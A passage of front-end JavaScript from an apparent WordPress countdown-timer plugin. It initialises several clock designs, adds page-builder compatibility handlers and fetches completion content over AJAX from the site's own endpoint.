( function($) {

	'use strict';

	var timer_cls = ' .wpcdt-clock';

	/* Tweak to remove blank p from timer content */
	jQuery('.wpcdt-desc p:empty').remove();	

	/* Refresh Completion Text */
	wpcdt_pro_refresh_completion_text();

	/* If caching is there */
	jQuery( '.wpcdt-timer-ajax' ).each(function( index ) {

		var cls_ele		= jQuery(this);
		var timer_conf	= JSON.parse( cls_ele.attr('data-conf') );
		var timer_id	= timer_conf.timer_id;
		var is_caching	= timer_conf.is_caching;

		/* Add loading */
		if( timer_conf.content_position == 'below_timer' ) {
			cls_ele.find('.wpcdt-timer-js .wpcdt-desc').before( '<div class="wpcdt-loading">'+ WpCdtPro.loading_text +'</div>' );
		} else {
			cls_ele.find('.wpcdt-timer-js').after( '<div class="wpcdt-loading">'+ WpCdtPro.loading_text +'</div>' );
		}

		if( is_caching == 1 ) {

			var timer_data = {
				'action'		: 'wpcdt_timer_caching_data',
				'timer_conf'	: timer_conf,
			};

			jQuery.post( WpCdtPro.ajax_url, timer_data, function( response ) {

				if( response.success == 1 ) {

					/* Remove loading */
					cls_ele.find('.wpcdt-loading').remove();

					if( timer_conf.timer_type == 'content' ) {

						cls_ele.find('.wpcdt-ajax-clock').replaceWith( response.data );

					} else {

						cls_ele.find('.wpcdt-timer-js').append( response.data );
					}

					/* Initialize Timer */
					wpcdt_pro_all_timer_init( response, cls_ele );
				}
			});
		}
	});

	/* Initialize Timer */
	wpcdt_pro_all_timer_init();

	/* Elementor Compatibility */
	/***** Elementor Compatibility Start *****/
	if( WpCdtPro.elementor_preview == 0 ) {

		$(window).on('elementor/frontend/init', function() {

			/* Tweak for Slick Slider */
			$('.wpcdt-timer-circle').each(function( index ) {

				var timer_id	= $(this).find('.wpcdt-timer-js').attr('id');
				timer_id	= timer_id + ' .wpcdt-clock-circle';

				setTimeout(function() {
					if( typeof(timer_id) !== 'undefined' && timer_id != '' ) {
						jQuery('#'+timer_id).TimeCircles().rebuild();
					}
				}, 350);
			});
		});
	}

	$(document).on('click', '.elementor-tab-title', function() {

		var ele_control	= $(this).attr('aria-controls');
		var timer_wrap	= $('#'+ele_control).find('.wpcdt-timer-circle');

		/* Tweak for slick slider */
		$( timer_wrap ).each(function( index ) {
			var timer_id	= $(this).find('.wpcdt-timer-js').attr('id');
				timer_id	= timer_id + ' .wpcdt-clock-circle';

			setTimeout(function() {
				jQuery('#'+timer_id).TimeCircles().rebuild();
			}, 350);

		});
	});
	/***** Elementor Compatibility End *****/

	/* Beaver Builder Compatibility for Accordion & Tab */
	$(document).on('click', '.fl-accordion-button, .fl-tabs-label', function() {

		var ele_control	= $(this).attr('aria-controls');
		var timer_wrap	= $('#'+ele_control).find('.wpcdt-timer-circle');

		/* Tweak for slick slider */
		$( timer_wrap ).each(function( index ) {

			var timer_id	= $(this).find('.wpcdt-timer-js').attr('id');
				timer_id	= timer_id + ' .wpcdt-clock-circle';

			setTimeout(function() {
				jQuery('#'+timer_id).TimeCircles().rebuild();
			}, 300);
		});
	});

	/* Divi Builder Compatibility for Tabs, Accordion & Toggle */
	$(document).on('click', '.et_pb_toggle', function() {

		var acc_cont	= $(this).find('.et_pb_toggle_content');
		var timer_wrap	= acc_cont.find('.wpcdt-timer-circle');

		/* Tweak for slick slider */
		$( timer_wrap ).each(function( index ) {

			var timer_id	= $(this).find('.wpcdt-timer-js').attr('id');
				timer_id	= timer_id + ' .wpcdt-clock-circle';

			$('#'+timer_id).css({'visibility': 'hidden', 'opacity': 0});

			if( typeof(timer_id) !== 'undefined' && timer_id != '' ) {
				jQuery('#'+timer_id).TimeCircles().rebuild();
				$('#'+timer_id).css({'visibility': 'visible', 'opacity': 1});
			}
		});
	});

	/* Visual Composer Compatibility for Toggle */
	$(document).on('click', '.vc_toggle', function() {

		var timer_wrap	= $(this).find('.vc_toggle_content .wpcdt-timer-circle');

		$( timer_wrap ).each(function( index ) {

			var timer_id	= $(this).find('.wpcdt-timer-js').attr('id');
				timer_id	= timer_id + ' .wpcdt-clock-circle';

			if( typeof(timer_id) !== 'undefined' && timer_id != '' ) {
				jQuery('#'+timer_id).TimeCircles().rebuild();
			}
		});
	});

	/* Visual Composer Compatibility for Tabs & Accordion */
	$(document).on('click', '.vc_tta-panel-title', function() {

		var cls_ele		= $(this).closest('.vc_tta-panel');
		var timer_wrap	= cls_ele.find('.wpcdt-timer-circle');

		$( timer_wrap ).each(function( index ) {

			var timer_id	= $(this).find('.wpcdt-timer-js').attr('id');
				timer_id	= timer_id + ' .wpcdt-clock-circle';

			if( typeof(timer_id) !== 'undefined' && timer_id != '' ) {
				jQuery('#'+timer_id).TimeCircles().rebuild();
			}
		});
	});
})(jQuery);

/* Function to refresh countdown timer completion text */
function wpcdt_pro_refresh_completion_text( ele ) {

	var cls_ele = ele ? ele : jQuery('body');

	/* Make Embeded Video Responsive */
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="vimeo.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="dailymotion.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="youtube.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="m.youtube.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="youtu.be"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="screencast-o-matic.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="videopress.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="video.wordpress.com"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="docs.google.com/presentation"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap iframe[src*="fast.wistia.net"]').wrap('<div class="wpcdt-iframe-wrap" />');
	cls_ele.find('.wpcdt-completion-wrap .wpcdt-iframe-responsive').wrap('<div class="wpcdt-iframe-wrap" />');
}

/* Function to initialize all the timer */
function wpcdt_pro_all_timer_init( caching_data, ele_obj ) {

	var timer_cls	= ' .wpcdt-clock';
	var shrt_atts	= caching_data	? caching_data.shrt_atts				: '';
	var timer_obj	= ele_obj		? ele_obj.find('.wpcdt-clock-circle')	: jQuery( '.wpcdt-timer-circle .wpcdt-clock-circle' );

	/* Circle Style 1 Timer initialize */
	timer_obj.each( function( index ) {

		var cls_ele			= jQuery(this).closest('.wpcdt-timer-wrap');
		var timer_conf		= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id		= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id		= timer_id + timer_cls;
		var current_date	= new Date( timer_conf.current_date );
		var expiry_date		= new Date( timer_conf.expiry_date );

		/* If caching is `true` and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		var over_conf		= wpcdt_pro_timer_over_conf( timer_conf, timer_id );
		var difference		= wpcdt_pro_date_diff( current_date, expiry_date );
		var total_seconds	= difference.total_seconds;

		/* If recuring time is there */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {

			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
			var end_date	= JSON.parse( recur_data );
				end_date	= end_date[0];

			var recur_date_time	= new Date( end_date );
			var difference		= wpcdt_pro_date_diff( current_date, recur_date_time );
			var total_seconds	= difference.total_seconds;

			jQuery('#'+timer_id).attr( 'data-timer', total_seconds );
		}

		jQuery('#'+timer_id).TimeCircles({
			'animation'			: timer_conf.timercircle_animation,
			'bg_width'			: ( timer_conf.timer_bg_width != '' )		? timer_conf.timer_bg_width		: 1.2,
			'fg_width'			: ( timer_conf.timercircle_width != '' )	? timer_conf.timercircle_width	: 0.1,
			'circle_bg_color'	: ( timer_conf.timer_bgclr != '' )			? timer_conf.timer_bgclr		: '#313332',
			'time'				: {
									'Days'		: {
													'text'	: timer_conf.day_text,
													'color'	: timer_conf.timer_day_bgclr,
													'show'	: ( timer_conf.is_days == 1 ) ? true : false,
												},
									'Hours'		: {
													'text'	: timer_conf.hour_text,
													'color'	: timer_conf.timer_hour_bgclr,
													'show'	: ( timer_conf.is_hours == 1 ) ? true : false,
												},
									'Minutes'	: {
													'text'	: timer_conf.minute_text,
													'color'	: timer_conf.timer_minute_bgclr,
													'show'	: ( timer_conf.is_minutes == 1 ) ? true : false,
												},
									'Seconds'	: {
													'text'	: timer_conf.second_text,
													'color'	: timer_conf.timer_second_bgclr,
													'show'	: ( timer_conf.is_seconds == 1 ) ? true : false,
												},
								},
		});

		jQuery("#"+timer_id).TimeCircles().addListener( wpcdt_pro_timer_complete );
		jQuery("#"+timer_id).addClass('wpcdt-timer-initialized');

		/* Timer complete function */
		function wpcdt_pro_timer_complete( unit, value, total_seconds ) {

			/* Need to stop timer otherwise it will start again on screen resize */
			if( total_seconds <= 0 ) {
				jQuery('#'+timer_id).TimeCircles().stop();
			}

			if( total_seconds == 0 && ! jQuery('#'+timer_id).hasClass('wpcdt-timer-finished') ) {
				jQuery('#'+timer_id).addClass( 'wpcdt-timer-finished' );
				wpcdt_pro_timer_over( over_conf, timer_conf );
			}
		}

		jQuery(window).on('resize', function() {
			jQuery('#'+timer_id).TimeCircles().rebuild();
		});
	});

	/* Vertical Flip(Design-2) Timer Initialize */
	timer_obj = ele_obj	? ele_obj.find('.wpcdt-clock-design-2') : jQuery( '.wpcdt-timer-design-2 .wpcdt-clock-design-2' );

	timer_obj.each(function( index ) {

		firstCalculation	= true;
		var cls_ele			= jQuery(this).closest('.wpcdt-timer-wrap');
		var timer_conf		= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id		= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id		= timer_id + timer_cls;
		var countdown_id	= jQuery('#'+timer_id);
		var date_diff		= timer_conf.date_diff;

		/* If check caching and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		var over_conf = wpcdt_pro_timer_over_conf( timer_conf, timer_id );

		/* If recuring time is there */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {
			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
				date_diff	= JSON.parse( recur_data );
				date_diff	= date_diff[1];
		}

		countdown_id.WpcdtClock({
			currentDateTime	: timer_conf.date_c,
			day				: date_diff.day,
			month			: date_diff.month,
			year			: date_diff.year,
			hour			: date_diff.hour,
			minute			: date_diff.minute,
			second			: date_diff.second,
			daysLabel		: timer_conf.day_text,
			hoursLabel		: timer_conf.hour_text,
			minutesLabel	: timer_conf.minute_text,
			secondsLabel	: timer_conf.second_text,
			timeZone		: parseFloat( WpCdtPro.timezone ),
			onComplete		: function() {
								wpcdt_pro_timer_over( over_conf, timer_conf );
							},
			afterCalculation: function() {
								var plugin	= this,
									units	= {
										days	: this.days,
										hours	: this.hours,
										minutes	: this.minutes,
										seconds	: this.seconds,
									},
									/* Max values per unit */
									maxValues = {
										hours	: '23',
										minutes	: '59',
										seconds	: '59',
									},
									actClass = 'active',
									befClass = 'before';

								/* Build necessary elements */
								if ( firstCalculation == true ) {
									firstCalculation = false;

									/* Build necessary markup */
									countdown_id.find('.wpcdt-unit-wrap .wpcdt-digits-wrap').each(function() {
										var $this		= jQuery(this),
											className	= $this.attr('data-unit'),
											value		= units[className],
											sub			= '',
											dig			= '';

										/* Build markup per unit digit */
										for(var x = 0; x < 10; x++) {
											sub += [
												'<div class="wpcdt-digit-inr">',
													'<div class="wpcdt-flip-wrap">',
														'<div class="up wpcdt-flip-inr">',
															'<div class="shadow"></div>',
															'<div class="inn">' + x + '</div>',
														'</div>',
														'<div class="down wpcdt-flip-inr">',
															'<div class="shadow"></div>',
															'<div class="inn">' + x + '</div>',
														'</div>',
													'</div>',
												'</div>'
											].join('');
										}

										/* Build markup for number */
										for (var i = 0; i < value.length; i++) {
											dig += '<div class="wpcdt-digits">' + sub + '</div>';
										}
										$this.html(dig);
									});
								}

								/* Iterate through units */
								jQuery.each(units, function(unit) {
									var digitCount = countdown_id.find('.' + unit + ' .wpcdt-digits').length,
										maxValueUnit = maxValues[unit],
										maxValueDigit,
										value = plugin.strPad(this, digitCount, '0');

									/* Iterate through digits of an unit */
									for (var i = value.length - 1; i >= 0; i--) {
										var $digitsWrap	= countdown_id.find('.' + unit + ' .wpcdt-digits:eq(' + (i) + ')'),
											$digits		= $digitsWrap.find('div.wpcdt-digit-inr');

										/* Use defined max value for digit or simply 9 */
										if (maxValueUnit) {
											maxValueDigit = (maxValueUnit[i] == 0) ? 9 : maxValueUnit[i];
										} else {
											maxValueDigit = 9;
										}

										/* Which numbers get the active and before class */
										var activeIndex = parseInt(value[i]),
											beforeIndex = (activeIndex == maxValueDigit) ? 0 : activeIndex + 1;

										/* Check if value change is needed */
										if ($digits.eq(beforeIndex).hasClass(actClass)) {
											$digits.parent().addClass('play');
										}

										/* Remove all classes */
										$digits
											.removeClass(actClass)
											.removeClass(befClass);

										/* Set classes */
										$digits.eq(activeIndex).addClass(actClass);
										$digits.eq(beforeIndex).addClass(befClass);
									}
								});
							}
		}).addClass('wpcdt-timer-initialized');
	});

	/* Circle Style 2 (Design-3) Timer Initialize */
	timer_obj = ele_obj	? ele_obj.find('.wpcdt-clock-design-3') : jQuery( '.wpcdt-timer-design-3 .wpcdt-clock-design-3' );

	timer_obj.each(function( index ) {

		var cls_ele		= jQuery(this).closest('.wpcdt-timer-wrap');
		var timer_conf	= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id	= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id	= timer_id + timer_cls;
		var date_diff	= timer_conf.date_diff;

		/* If check caching and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		var over_conf = wpcdt_pro_timer_over_conf( timer_conf, timer_id );

		/* If recuring time is there */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {
			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
				date_diff	= JSON.parse( recur_data );
				date_diff	= date_diff[1];
		}

		jQuery("#"+timer_id).WpcdtClock({
			currentDateTime	: timer_conf.date_c,
			day				: date_diff.day,
			month			: date_diff.month,
			year			: date_diff.year,
			hour			: date_diff.hour,
			minute			: date_diff.minute,
			second			: date_diff.second,
			daysLabel		: timer_conf.day_text,
			hoursLabel		: timer_conf.hour_text,
			minutesLabel	: timer_conf.minute_text,
			secondsLabel	: timer_conf.second_text,
			timeZone		: parseFloat( WpCdtPro.timezone ),
			onComplete		: function() {
								wpcdt_pro_timer_over( over_conf, timer_conf );
							},
			onChange		: function() {
								if( timer_conf.is_days == 1 ) {
									wpcdt_pro_draw_circle( document.getElementById('ce-days-'+timer_conf.unique), this.days, 365, timer_conf.timer_bgclr, timer_conf.timer_day_bgclr, timer_conf.timer2_width );
								}
								if( timer_conf.is_hours == 1 ) {
									wpcdt_pro_draw_circle( document.getElementById('ce-hours-'+timer_conf.unique), this.hours, 24, timer_conf.timer_bgclr, timer_conf.timer_hour_bgclr, timer_conf.timer2_width );
								}
								if( timer_conf.is_minutes == 1 ) {
									wpcdt_pro_draw_circle( document.getElementById('ce-minutes-'+timer_conf.unique), this.minutes, 60, timer_conf.timer_bgclr, timer_conf.timer_minute_bgclr, timer_conf.timer2_width );
								}
								if( timer_conf.is_seconds == 1 ) {
									wpcdt_pro_draw_circle( document.getElementById('ce-seconds-'+timer_conf.unique), this.seconds, 60, timer_conf.timer_bgclr, timer_conf.timer_second_bgclr, timer_conf.timer2_width );
								}
							}
		}).addClass('wpcdt-timer-initialized');
	});

	/* Bars Clock(Design-4) Timer Initialize */
	timer_obj = ele_obj	? ele_obj.find('.wpcdt-clock-design-4') : jQuery( '.wpcdt-timer-design-4 .wpcdt-clock-design-4' );

	timer_obj.each(function( index ) {
		var cls_ele		= jQuery(this).closest('.wpcdt-timer-wrap');
		var timer_conf	= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id	= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id	= timer_id + timer_cls;
		var date_diff	= timer_conf.date_diff;

		/* If check caching and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		var over_conf = wpcdt_pro_timer_over_conf( timer_conf, timer_id );

		/* If recuring time is there */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {
			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
				date_diff	= JSON.parse( recur_data );
				date_diff	= date_diff[1];
		}

		var daysFill	= jQuery("#"+timer_id+" .ce-bar-days .wpcdt-fill");
		var hoursFill	= jQuery("#"+timer_id+" .ce-bar-hours .wpcdt-fill");
		var minutesFill	= jQuery("#"+timer_id+" .ce-bar-minutes .wpcdt-fill");
		var secondsFill	= jQuery("#"+timer_id+" .ce-bar-seconds .wpcdt-fill");

		jQuery("#"+timer_id).WpcdtClock({
			currentDateTime	: timer_conf.date_c,
			day				: date_diff.day,
			month			: date_diff.month,
			year			: date_diff.year,
			hour			: date_diff.hour,
			minute			: date_diff.minute,
			second			: date_diff.second,
			daysLabel		: timer_conf.day_text,
			hoursLabel		: timer_conf.hour_text,
			minutesLabel	: timer_conf.minute_text,
			secondsLabel	: timer_conf.second_text,
			timeZone		: parseFloat( WpCdtPro.timezone ),
			onComplete		: function() {
								wpcdt_pro_timer_over( over_conf, timer_conf );
							},
			onChange		: function() {
								wpcdt_pro_ct_bar( daysFill, this.days, 365 );
								wpcdt_pro_ct_bar( hoursFill, this.hours, 24 );
								wpcdt_pro_ct_bar( minutesFill, this.minutes, 60 );
								wpcdt_pro_ct_bar( secondsFill, this.seconds, 60 );
							}
		}).addClass('wpcdt-timer-initialized');
	});

	/* Horizontal Flip(Design-8) Timer Initialize */
	timer_obj = ele_obj	? ele_obj.find('.wpcdt-clock-design-8') : jQuery( '.wpcdt-timer-design-8 .wpcdt-clock-design-8' );

	timer_obj.each(function( index ) {

		var cls_ele		= jQuery(this).closest('.wpcdt-timer-wrap');
		var timer_conf	= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id	= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id	= timer_id + timer_cls;
		var date_diff	= timer_conf.date_diff;

		/* If check caching and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		var over_conf = wpcdt_pro_timer_over_conf( timer_conf, timer_id );

		/* If recuring time is there */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {
			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
				date_diff	= JSON.parse( recur_data );
				date_diff	= date_diff[1];
		}

		jQuery("#"+timer_id).WpcdtClock({
			wrapDigits		: false,
			currentDateTime	: timer_conf.date_c,
			day				: date_diff.day,
			month			: date_diff.month,
			year			: date_diff.year,
			hour			: date_diff.hour,
			minute			: date_diff.minute,
			second			: date_diff.second,
			daysLabel		: timer_conf.day_text,
			hoursLabel		: timer_conf.hour_text,
			minutesLabel	: timer_conf.minute_text,
			secondsLabel	: timer_conf.second_text,
			timeZone		: parseFloat( WpCdtPro.timezone ),
			daysWrapper		: '.ce-days .wpcdt-flip-back',
			hoursWrapper	: '.ce-hours .wpcdt-flip-back',
			minutesWrapper	: '.ce-minutes .wpcdt-flip-back',
			secondsWrapper	: '.ce-seconds .wpcdt-flip-back',
			onComplete		: function() {
								wpcdt_pro_timer_over( over_conf, timer_conf );
							},
			onChange		: function() {
								wpcdt_pro_horizontal_animation( jQuery("#"+timer_id+" .wpcdt-col .wpcdt-digits"), this );
							},
		}).addClass('wpcdt-timer-initialized');

		/* Fallback for Internet Explorer */
		if (navigator.userAgent.indexOf('MSIE') !== -1 || navigator.appVersion.indexOf('Trident/') > 0) {
			jQuery('html').addClass('wpcdt-ie');
		}
	});

	/* Simple clock 1 to 5 (Content), Circle Style 3 & Shadow Clock Timer Initilize */
	timer_obj = ele_obj	? ele_obj.find('.wpcdt-clock-timer') : jQuery( '.wpcdt-timer-clock .wpcdt-clock-timer' );

	timer_obj.each(function( index ) {

		var cls_ele		= jQuery(this).closest('.wpcdt-timer-wrap');
		var timer_conf	= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id	= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id	= timer_id + timer_cls;
		var date_diff	= timer_conf.date_diff;

		/* If check caching and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		var over_conf = wpcdt_pro_timer_over_conf( timer_conf, timer_id );

		/* If recuring time is there */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {
			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
				date_diff	= JSON.parse( recur_data );
				date_diff	= date_diff[1];
		}

		jQuery("#"+timer_id).WpcdtClock({
			currentDateTime	: timer_conf.date_c,
			day				: date_diff.day,
			month			: date_diff.month,
			year			: date_diff.year,
			hour			: date_diff.hour,
			minute			: date_diff.minute,
			second			: date_diff.second,
			daysLabel		: timer_conf.day_text,
			hoursLabel		: timer_conf.hour_text,
			minutesLabel	: timer_conf.minute_text,
			secondsLabel	: timer_conf.second_text,
			timeZone		: parseFloat( WpCdtPro.timezone ),
			onComplete		: function() {
								wpcdt_pro_timer_over( over_conf, timer_conf );
							},
			onChange		: function() {
								if( timer_conf.design == 'design-9' ) {
									wpcdt_pro_modern_animation( jQuery("#"+timer_id+" .wpcdt-digits span") );
								}
							}
		}).addClass('wpcdt-timer-initialized');

		/* Fallback for Internet Explorer */
		if (navigator.userAgent.indexOf('MSIE') !== -1 || navigator.appVersion.indexOf('Trident/') > 0) {
			jQuery('html').addClass('wpcdt-ie');
		}
	});

	/* Simple Timer Type Design 1 Timer Intialize */
	timer_obj = ele_obj	? ele_obj.find('.wpcdt-clock-simple') : jQuery( '.wpcdt-smpl-timer-wrap .wpcdt-clock-simple' );
	
	timer_obj.each(function( index ) {
		
		var cls_ele		= jQuery(this).closest('.wpcdt-smpl-timer-wrap');
		var timer_conf	= shrt_atts ? shrt_atts : JSON.parse( cls_ele.attr('data-conf') );
		var timer_id	= cls_ele.find('.wpcdt-timer-js').attr('id');
			timer_id	= timer_id + ' .wpcdt-clock-simple';
		var date_diff	= timer_conf.date_diff;

		/* If check caching and ajax response is null */
		if( timer_conf.is_caching == 1 && ! caching_data ) {
			return;
		}

		/* Check Timer Initialize Class */
		if( jQuery('#'+timer_id).hasClass('wpcdt-timer-initialized') ) {
			return;
		}

		/* If recuring time is there and timer is active */
		if( timer_conf.timer_mode == 'evergreen' && timer_conf.recuring_time > 0 && timer_conf.timer_status == 'active' ) {
			var recur_data	= wpcdt_pro_recuring_time( timer_conf );
				date_diff	= JSON.parse( recur_data );
				date_diff	= date_diff[1];
		}

		jQuery("#"+timer_id).WpcdtClock({
			currentDateTime	: timer_conf.date_c,
			day				: date_diff.day,
			month			: date_diff.month,
			year			: date_diff.year,
			hour			: date_diff.hour,
			minute			: date_diff.minute,
			second			: date_diff.second,
			daysLabel		: timer_conf.day_text,
			hoursLabel		: timer_conf.hour_text,
			minutesLabel	: timer_conf.minute_text,
			secondsLabel	: timer_conf.second_text,
			timeZone		: parseFloat( WpCdtPro.timezone ),
		}).addClass('wpcdt-timer-initialized');
	});
}

/* Function to get difference between two dates */
function wpcdt_pro_date_diff( current_date, expiry_date ) {
	material					= [];
	material['days']			= 0;
	material['hours']			= 0;
	material['minutes']			= 0;
	material['seconds']			= 0;
	material['total_seconds']	= 0;

	if( expiry_date > current_date ) {

		/* get total seconds between the times */
		var delta = Math.abs( expiry_date - current_date ) / 1000;

		/* calculate (and subtract) whole days */
		var days			= Math.floor( delta / 86400 );
		delta				-= days * 86400;
		material['days']	= days;

		/* calculate (and subtract) whole hours */
		var hours			= Math.floor( delta / 3600 ) % 24;
		delta				-= hours * 3600;
		material['hours']	= hours;

		/* calculate (and subtract) whole minutes */
		var minutes			= Math.floor( delta / 60 ) % 60;
		delta				-= minutes * 60;
		material['minutes']	= minutes;

		/* what's left is seconds */
		var seconds			= delta % 60;
		material['seconds']	= seconds;

		var total_seconds			= ( expiry_date.getTime() - current_date.getTime() ) / 1000;
		material['total_seconds']	= total_seconds;

		return material;
	}

	return material;
}

/* Timer 3 function */
function wpcdt_pro_deg(value) {
	return ( Math.PI / 180 ) * value - ( Math.PI / 2 );
}

/* Timer 3 Animation */
function wpcdt_pro_draw_circle( canvas, value, max, bg_color, fill_color, circle_width ) {

	/* If canvas is not there */
	if( ! canvas ) {
		return;
	}

	var circle = canvas.getContext('2d');

	circle.clearRect(0, 0, canvas.width, canvas.height);
	circle.lineWidth = circle_width;

	circle.beginPath();
	circle.arc(
			canvas.width / 2,
			canvas.height / 2,
			canvas.width / 2 - circle.lineWidth,
			wpcdt_pro_deg(0),
			wpcdt_pro_deg(360 / max * (max - value)),
			false);
	circle.strokeStyle = bg_color;
	circle.stroke();

	circle.beginPath();
	circle.arc(
			canvas.width / 2,
			canvas.height / 2,
			canvas.width / 2 - circle.lineWidth,
			wpcdt_pro_deg(0),
			wpcdt_pro_deg(360 / max * (max - value)),
			true);
	circle.strokeStyle = fill_color;
	circle.stroke();
}

/* Timer 4 Animation */
function wpcdt_pro_ct_bar( $el, value, max ) {
	barWidth = 100 -(100/max * value);
	$el.width( barWidth + '%' );
}

/* Function to set horizontal flip animation */
function wpcdt_pro_horizontal_animation( $el, data ) {

	$el.each( function(index) {
		var $this		= jQuery(this),
			$flipFront	= $this.find('.wpcdt-flip-front'),
			$flipBack	= $this.find('.wpcdt-flip-back'),
			field		= $flipBack.text(),
			fieldOld	= $this.attr('data-old');

		if ( typeof fieldOld === 'undefined' ) {
			$this.attr( 'data-old', field );
		}

		if ( field != fieldOld ) {
			$this.addClass('wpcdt-animate');
			window.setTimeout(function() {
				$flipFront.text( field );
				$this.removeClass('wpcdt-animate')
					.attr( 'data-old', field );
			}, 800);
		}
	});
}

/* Function to set modern clock animation */
function wpcdt_pro_modern_animation($el) {
	$el.each( function(index) {
		var $this		= jQuery(this),
			fieldText	= $this.text(),
			fieldData	= $this.attr('data-value'),
			fieldOld	= $this.attr('data-old');

		if (typeof fieldOld === 'undefined') {
			$this.attr('data-old', fieldText);
		}

		if (fieldText != fieldData) {

			$this
				.attr('data-value', fieldText)
				.attr('data-old', fieldData)
				.addClass('wpcdt-animate');

			window.setTimeout(function() {
				$this
					.removeClass('wpcdt-animate')
					.attr('data-old', fieldText);
			}, 300);
		}
	});
}

/* Function when clock timer is finished */
function wpcdt_pro_timer_over( over_conf, timer_conf ) {

	var cls_ele = jQuery('#'+ over_conf.timer_id).closest('.wpcdt-timer-wrap');

	var data = {
		'action'		: 'wpcdt_pro_end_timer',
		'timer_conf'	: timer_conf,
	};

	/* Trigger For Before Fire Ajax */
	jQuery('body').trigger('wpcdt_timer_before_finish', [ over_conf, timer_conf, cls_ele ] );

	jQuery.post( WpCdtPro.ajax_url, data, function( response ) {

		if( response.success == 1 ) {

			/* Check wheather content to be display after complete or not */
			if( over_conf.content_after_complete == 0 ) {
				cls_ele.find('.wpcdt-desc').remove();
			}

			cls_ele.find('.wpcdt-clock').remove();
			cls_ele.find('.wpcdt-timer').append( response.completion_text );
			cls_ele.find('.wpcdt-completion-wrap').fadeIn();

			/* Refresh completion text */
			wpcdt_pro_refresh_completion_text( cls_ele );

			/* Init timer if completion wrap have any timer added */
			wpcdt_pro_all_timer_init();

			/* Remove Local Storage */
			localStorage.removeItem('wpcdt_'+ over_conf.post_id +'_current_time');
			localStorage.removeItem('wpcdt_'+ over_conf.post_id +'_end_time');

			/* Trigger For After Finish Ajax */
			jQuery('body').trigger('wpcdt_timer_after_finish', [ over_conf, timer_conf, response, cls_ele ] );
		}
	});
}

/* Fundtion to get timer over conf */
function wpcdt_pro_timer_over_conf( timer_conf, timer_id ) {

	var over_conf = {
		'timer_id'					: timer_id,
		'post_id'					: timer_conf.timer_id,
		'recur_flag'				: timer_conf.recuring_time,
		'timer_mode'				: timer_conf.timer_mode,
		'content_after_complete'	: timer_conf.content_after_complete,
	};

	return over_conf;
}

/* Function to set recuring data in browser local storage */
function wpcdt_pro_set_recuring_data( timer_conf, key, data ) {

	var set_data	= '';
	var timer_id	= timer_conf.timer_id;

	if( key == 'time_conf' ) {

		var date_data	= {0: timer_conf.recur_date_time, 1: timer_conf.recuring_diff};
			set_data	= JSON.stringify( date_data );

	} else if( key == 'current_time' ) {

		set_data = JSON.stringify( timer_conf.current_time );

